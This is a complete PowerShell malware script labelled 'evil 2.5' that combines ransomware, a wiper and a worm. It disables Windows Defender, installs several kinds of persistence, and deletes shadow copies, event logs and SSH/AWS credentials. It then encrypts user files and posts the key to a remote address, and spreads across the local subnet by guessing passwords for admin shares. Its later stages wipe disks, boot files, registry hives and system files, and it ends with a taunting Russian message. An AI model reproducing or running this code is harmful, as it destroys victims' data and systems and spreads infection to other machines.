# evil 2.5
$mutex = New-Object System.Threading.Mutex($false, "Global\EVIL_MUTEX_2025")
if (-not $mutex.WaitOne(0, $false)) { exit }

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$persistentPath = "$env:APPDATA\Microsoft\Windows\evil.ps1"
Copy-Item $PSCommandPath $persistentPath -Force
$flagPath = "$env:APPDATA\evil_done.flag"

if (-not (Test-Path $flagPath)) {
    try {
        Start-Process -FilePath "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -ArgumentList "-DisableTamperProtection" -NoNewWindow -Wait -ErrorAction Stop
        Start-Sleep -Seconds 3
        Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Get-Process MsMpEng* -ErrorAction SilentlyContinue | Stop-Process -Force
        Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
        Set-MpPreference -DisableBehaviorMonitoring $true -Force
        Set-MpPreference -DisableBlockAtFirstSeen $true -Force
        Set-MpPreference -DisableIOAVProtection $true -Force
        Set-MpPreference -DisablePrivacyMode $true -Force
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
        Set-MpPreference -DisableArchiveScanning $true -Force
        Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
        Set-MpPreference -DisableScriptScanning $true -Force
        Set-MpPreference -SubmitSamplesConsent 2
    } catch { }
    
    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($shortcutPath)
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
    $sc.Save()
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "evil" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -Force
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "evil" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
    
    $hostsPath = "C:\Windows\System32\drivers\etc\hosts"
    if (Test-Path $hostsPath) { Remove-Item $hostsPath -Force -ErrorAction SilentlyContinue }
    
    New-Item $flagPath -Force
    Restart-Computer -Force
    exit
}

Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -NoNewWindow -Wait
wevtutil cl System 2>$null
wevtutil cl Security 2>$null
wevtutil cl Application 2>$null
wevtutil cl Setup 2>$null
wevtutil cl "Windows PowerShell" 2>$null
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\.ssh\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\.aws\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\.config\*" -Recurse -Force -ErrorAction SilentlyContinue

$key = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
$folders = @(
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Desktop", 
    "$env:USERPROFILE\Downloads", 
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\Music",
    "$env:USERPROFILE\OneDrive",
    "$env:USERPROFILE\Dropbox",
    "C:\Users\Public\Documents",
    "C:\ProgramData"
)
$extensions = @("*.docx","*.xlsx","*.jpg","*.txt","*.pdf","*.zip","*.rar","*.7z","*.bak","*.backup","*.psd","*.ai","*.cdr","*.dwg","*.dxf","*.cpp","*.cs","*.py","*.js","*.html","*.css","*.sql","*.db","*.mdf","*.ldf","*.vhd","*.vhdx","*.vmcx","*.vmrs","*.vmtm","*.vmdk")
$fileCounter = 0
$maxFilesToEncrypt = 5000
foreach ($folder in $folders) {
    if (Test-Path $folder) {
        $allFiles = Get-ChildItem $folder -Recurse -Include $extensions -ErrorAction SilentlyContinue
        foreach ($f in $allFiles) {
            if ($fileCounter -ge $maxFilesToEncrypt) { break 2 }
            try {
                $aes = [System.Security.Cryptography.Aes]::Create()
                $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32).Substring(0,32))
                $aes.IV = 0..15 | ForEach-Object { Get-Random -Min 0 -Max 255 }
                $encryptor = $aes.CreateEncryptor()
                $outPath = "\\?\$($f.FullName).enc"
                $fsOut = [System.IO.File]::Create($outPath)
                $fsOut.Write($aes.IV, 0, $aes.IV.Length)
                $fsIn = [System.IO.File]::OpenRead($f.FullName)
                $buffer = New-Object byte[] (1024 * 1024)
                while (($read = $fsIn.Read($buffer, 0, $buffer.Length)) -gt 0) {
                    $encData = $encryptor.TransformBlock($buffer, 0, $read, $null, 0)
                    $fsOut.Write($encData, 0, $encData.Length)
                }
                $final = $encryptor.TransformFinalBlock($buffer, 0, 0)
                $fsOut.Write($final, 0, $final.Length)
                $fsIn.Close()
                $fsOut.Close()
                Remove-Item $f.FullName -Force
                $fileCounter++
            } catch { }
        }
    }
}

$c2success = $false
for ($try = 1; $try -le 3; $try++) {
    try {
        $web = New-Object Net.WebClient
        $web.Headers.Add("User-Agent", "Mozilla/5.0")
        $web.UploadString("http://192.168.1.100/log", "POST", "key=$key")
        $c2success = $true
        break
    } catch { Start-Sleep -Seconds 5 }
}
if (-not $c2success) {
    $fallbackPath = "$env:APPDATA\Microsoft\Windows\.key_backup"
    Set-Content -Path $fallbackPath -Value $key -Force -ErrorAction SilentlyContinue
}

$wifiAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -match "wi-fi|wireless|wlan|беспровод|802.11|intel.*wireless|realtek.*wireless|qualcomm.*wireless|broadcom.*wireless"
}
foreach ($adapter in $wifiAdapters) {
    Disable-NetAdapter -Name $adapter.Name -Confirm:$false -Force
    Start-Sleep -Milliseconds 500
    Remove-NetAdapter -Name $adapter.Name -Confirm:$false -ErrorAction SilentlyContinue
}
Stop-Service "WlanSvc" -Force -ErrorAction SilentlyContinue
Set-Service "WlanSvc" -StartupType Disabled
Stop-Service "WlanHostedNetwork" -Force -ErrorAction SilentlyContinue
Set-Service "WlanHostedNetwork" -StartupType Disabled
Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne "Loopback" } | ForEach-Object {
    Disable-NetAdapter -Name $_.Name -Confirm:$false -Force
}

while ($fileCounter -lt $maxFilesToEncrypt -and (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
    Start-Sleep -Seconds 10
}
Start-Sleep -Seconds 5

$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
if ($localIP) {
    $network = $localIP -replace '\.[0-9]+$', ''
    $adminUser = $env:USERNAME
    $passwords = @("", "password", "123456", "admin", "123", "qwerty", "abc123", "111111", "123123", "admin123")
    for ($i = 1; $i -le 254; $i++) {
        $targetIP = "$network.$i"
        if ($targetIP -eq $localIP) { continue }
        foreach ($pass in $passwords) {
            try {
                net use "\\$targetIP\Admin$" /user:"$adminUser" "$pass" > $null 2>&1
                if ($LASTEXITCODE -eq 0) {
                    Copy-Item -Path $persistentPath -Destination "\\$targetIP\Admin$\evil.ps1" -Force -ErrorAction SilentlyContinue
                    schtasks /create /s $targetIP /tn "evil" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\evil.ps1" /sc ONLOGON /ru SYSTEM /f 2>$null
                    net use "\\$targetIP\Admin$" /delete 2>$null
                    break
                }
            } catch { }
        }
    }
}

try {
    for ($diskNum = 0; $diskNum -le 3; $diskNum++) {
        try {
            $disk = "\\.\PhysicalDrive$diskNum"
            $null = [System.IO.File]::WriteAllBytes($disk, New-Object byte[] 512)
            $bigZero = New-Object byte[] (10MB)
            $fs = [System.IO.File]::OpenWrite($disk)
            $fs.Write($bigZero, 0, $bigZero.Length)
            $fs.Close()
        } catch { }
    }
    
    $uefiPaths = @(
        "C:\EFI\Microsoft\Boot\BCD",
        "C:\EFI\Microsoft\Boot\bootmgfw.efi",
        "C:\EFI\Boot\bootx64.efi",
        "C:\EFI\Boot\bootia32.efi",
        "C:\EFI\Microsoft\Boot\bootmgr.efi",
        "C:\EFI\Microsoft\Recovery\BCD"
    )
    foreach ($path in $uefiPaths) {
        if (Test-Path $path) { Remove-Item $path -Force -ErrorAction SilentlyContinue }
    }
    
    for ($diskNum = 0; $diskNum -le 3; $diskNum++) {
        $diskpartScript = @"
select disk $diskNum
clean
convert mbr
exit
"@
        $diskpartScript | diskpart.exe 2>$null
    }
    
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match "^[A-Z]:\\$" }
    foreach ($drive in $drives) {
        $driveLetter = $drive.Root.Replace("\","")
        try {
            $rawDisk = "\\.\$driveLetter"
            $zeroBlock = New-Object byte[] (1MB)
            $fs = [System.IO.File]::OpenWrite($rawDisk)
            for ($j = 0; $j -lt 500; $j++) {
                $fs.Write($zeroBlock, 0, $zeroBlock.Length)
            }
            $fs.Close()
        } catch { }
    }
} catch { }

try {
    $registryPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager",
        "HKLM:\SYSTEM\CurrentControlSet\Services",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot",
        "HKLM:\HARDWARE"
    )
    foreach ($regPath in $registryPaths) {
        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    reg delete "HKLM\SYSTEM" /f 2>$null
    reg delete "HKLM\SOFTWARE\Microsoft" /f 2>$null
} catch { }

try {
    $allDrivers = pnputil /enum-drivers | Select-String -Pattern "Published Name\s*:\s*(.+\.inf)" | ForEach-Object { $matches[1] }
    foreach ($driver in $allDrivers) {
        pnputil /delete-driver $driver /uninstall /force 2>$null
    }
    Remove-Item -Path "C:\Windows\System32\drivers\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\System32\DriverStore\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch { }

try {
    $systemFiles = @(
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\winload.efi",
        "C:\Windows\System32\ntoskrnl.exe",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\config\SYSTEM",
        "C:\Windows\System32\config\SOFTWARE",
        "C:\Windows\System32\config\SAM",
        "C:\Windows\System32\config\SECURITY",
        "C:\Windows\System32\config\DEFAULT"
    )
    foreach ($file in $systemFiles) {
        if (Test-Path $file) { Remove-Item $file -Force -ErrorAction SilentlyContinue }
    }
    Remove-Item -Path "C:\Windows\System32\*.dll" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\SysWOW64\*.dll" -Force -ErrorAction SilentlyContinue
} catch { }

$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null -and $_.Root -ne "A:\" -and $_.Root -ne "B:\" }
foreach ($drive in $drives) {
    $driveName = $drive.Name
    $fillPath = "$($drive.Root)fill"
    if (-not (Test-Path $fillPath)) { New-Item -ItemType Directory -Path $fillPath -Force -ErrorAction SilentlyContinue }
    $maxIterations = 500
    $iter = 0
    while ($iter -lt $maxIterations) {
        $currentFree = (Get-PSDrive $driveName).Free
        if ($currentFree -le 1MB) { break }
        $chunkSize = [Math]::Min(500MB, $currentFree - 1MB)
        if ($chunkSize -le 0) { break }
        try {
            $dummy = New-Object byte[] ($chunkSize)
            (New-Object Random).NextBytes($dummy)
            $fileName = "$fillPath\$(Get-Date -Format 'yyyyMMddHHmmssfff')_$([System.IO.Path]::GetRandomFileName()).bin"
            [System.IO.File]::WriteAllBytes($fileName, $dummy)
        } catch { break }
        $iter++
    }
    $lastFree = (Get-PSDrive $driveName).Free
    if ($lastFree -gt 0 -and $lastFree -le 10MB) {
        try {
            $lastDummy = New-Object byte[] ($lastFree)
            (New-Object Random).NextBytes($lastDummy)
            $lastFile = "$fillPath\final_$(Get-Date -Format 'yyyyMMddHHmmss').bin"
            [System.IO.File]::WriteAllBytes($lastFile, $lastDummy)
        } catch { }
    }
}

try {
    $users = Get-LocalUser | Where-Object { $_.Name -ne $env:USERNAME -and $_.Name -ne "Administrator" }
    foreach ($user in $users) {
        Remove-LocalUser -Name $user.Name -Force -ErrorAction SilentlyContinue
    }
} catch { }

try {
    Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
        $driveLetter = $_.DeviceID.Substring(0,2)
        pnputil /disable-device $driveLetter 2>$null
    }
    $allDevices = pnputil /enum-devices | Select-String -Pattern "Instance ID\s*:\s*(.+)" | ForEach-Object { $matches[1] }
    foreach ($device in $allDevices) {
        pnputil /disable-device $device 2>$null
    }
} catch { }

try {
    if ([Environment]::Is64BitOperatingSystem -eq $false) {
        $cmosScript = @"
o 70 2e
o 71 ff
q
"@
        $cmosScript | debug 2>$null
    }
    wmic bios set /? 2>$null
} catch { }

for ($i = 0; $i -lt 3; $i++) {
    [System.Console]::Beep(1000, 500)
    Start-Sleep -Milliseconds 100
    [System.Console]::Beep(1500, 500)
    Start-Sleep -Milliseconds 100
    [System.Console]::Beep(2000, 1000)
    Start-Sleep -Milliseconds 200
}

$cpuCores = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
for ($i = 0; $i -lt $cpuCores; $i++) {
    Start-Job -ScriptBlock { while ($true) { $null = 1..1000000 | ForEach-Object { $_ * $_ } } }
}

$gpuScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.FormBorderStyle = 'None'
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10
$timer.Add_Tick({
    $bmp = New-Object System.Drawing.Bitmap($form.Width, $form.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $r = Get-Random -Min 0 -Max 255
    $g.Clear([System.Drawing.Color]::FromArgb($r, $r, $r))
    $form.BackgroundImage = $bmp
    $g.Dispose()
})
$timer.Start()
$form.ShowDialog()
'@
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$gpuScript`""

$asciiSkull = @"
                                                     __xxxxxxxxxxxxxxxx___.
                        _gxXXXXXXXXXXXXXXXXXXXXXXXX!x_
                   __x!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!x_
                ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx_
              ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!_
            _!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.
          gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXs
        ,!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.
       g!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
      iXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
     ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
     !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
   ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
   !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXi
  dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   XXXXXXXXXXXXXXXXXXXf~~~VXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvvvvXXXXXXXXXXXXXX!
   !XXXXXXXXXXXXXXXf`       'XXXXXXXXXXXXXXXXXXXXXf`          '~XXXXXXXXXXP
    vXXXXXXXXXXXX!            !XXXXXXXXXXXXXXXXXX!              !XXXXXXXXX
     XXXXXXXXXXv`              'VXXXXXXXXXXXXXXX                !XXXXXXXX!
     !XXXXXXXXX.                 YXXXXXXXXXXXXX!                XXXXXXXXX
      XXXXXXXXX!                 ,XXXXXXXXXXXXXX                VXXXXXXX!
      'XXXXXXXX!                ,!XXXX ~~XXXXXXX               iXXXXXX~
       'XXXXXXXX               ,XXXXXX   XXXXXXXX!             xXXXXXX!
        !XXXXXXX!xxxxxxs______xXXXXXXX   'YXXXXXX!          ,xXXXXXXXX
         YXXXXXXXXXXXXXXXXXXXXXXXXXXX`    VXXXXXXX!s. __gxx!XXXXXXXXXP
          XXXXXXXXXXXXXXXXXXXXXXXXXX!      'XXXXXXXXXXXXXXXXXXXXXXXXX!
          XXXXXXXXXXXXXXXXXXXXXXXXXP        'YXXXXXXXXXXXXXXXXXXXXXXX!
          XXXXXXXXXXXXXXXXXXXXXXXX!     i    !XXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXX!     XX   !XXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXXx_   iXX_,_dXXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXP
          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
           ~vXvvvvXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                    'VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvv~
                      'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~
                  _    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`
                 -XX!  !XXXXXXX~XXXXXXXXXXXXXXXXXXXXXX~   Xxi
                  YXX  '~ XXXXX XXXXXXXXXXXXXXXXXXXX`     iXX`
                  !XX!    !XXX` XXXXXXXXXXXXXXXXXXXX      !XX
                  !XXX    '~Vf  YXXXXXXXXXXXXXP YXXX     !XXX
                  !XXX  ,_      !XXP YXXXfXXXX!  XXX     XXXV
                  !XXX !XX           'XXP 'YXX!       ,.!XXX!
                  !XXXi!XP  XX.                  ,_  !XXXXXX!
                  iXXXx X!  XX! !Xx.  ,.     xs.,XXi !XXXXXXf
                   XXXXXXXXXXXXXXXXX! _!XXx  dXXXXXXX.iXXXXXX
                   VXXXXXXXXXXXXXXXXXXXXXXXxxXXXXXXXXXXXXXXX!
                   YXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXV
                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                       VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                         VXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`
                          ~vXXXXXXXXXXXXXXXXXXXXXXXf`
                              ~vXXXXXXXXXXXXXXXXv~
                                 '~VvXXXXXXXV~~
                                       ~~
"@

$messageScript = @"
Add-Type -AssemblyName System.Windows.Forms
`$form = New-Object System.Windows.Forms.Form
`$form.WindowState = 'Maximized'
`$form.TopMost = `$true
`$form.FormBorderStyle = 'None'
`$form.BackColor = [System.Drawing.Color]::Black
`$label = New-Object System.Windows.Forms.Label
`$label.Text = "$asciiSkull`n`nВы добровольно запустили этот файл) by. evil"
`$label.ForeColor = [System.Drawing.Color]::White
`$label.Font = New-Object System.Drawing.Font("Courier New", 24, [System.Drawing.FontStyle]::Bold)
`$label.AutoSize = `$true
`$label.TextAlign = 'MiddleCenter'
`$form.Controls.Add(`$label)
`$form.Add_Shown({ `$form.Activate(); `$label.Left = (`$form.Width - `$label.Width) / 2; `$label.Top = (`$form.Height - `$label.Height) / 2 })
`$form.ShowDialog()
"@
Start-Process powershell.exe -ArgumentList "-WindowStyle Normal -Command `"$messageScript`""
Start-Sleep -Seconds 5

Get-Process | Where-Object { $_.Id -ne $pid } | Stop-Process -Force -ErrorAction SilentlyContinue

Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
Remove-Item $persistentPath -Force -ErrorAction SilentlyContinue

Stop-Computer -Force